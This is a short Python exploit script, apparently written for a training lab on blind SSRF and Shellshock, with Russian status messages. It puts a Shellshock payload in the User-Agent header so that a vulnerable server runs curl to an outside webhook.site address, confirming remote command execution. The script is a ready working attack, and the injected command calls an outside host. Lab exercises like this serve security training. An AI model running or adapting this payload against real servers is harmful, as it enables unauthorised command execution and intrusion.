

import requests

url = "http://laplasrouse3-blind_ssrf_shellshock.labs-is-here.online/preview_post/1"
my_webhook = "https://webhook.site/011a51af-70a0-44fd-b8db-728e59646214"
payload = f"shellshock () {{ :; }}; curl {my_webhook}"

headers = {
    "User-Agent": payload
}

response = requests.get(url, headers=headers)
print("Status code:", response.status_code)
print("Ответ лаборатории:", response.text)
print("Проверь свой webhook: должен прийти входящий запрос!")

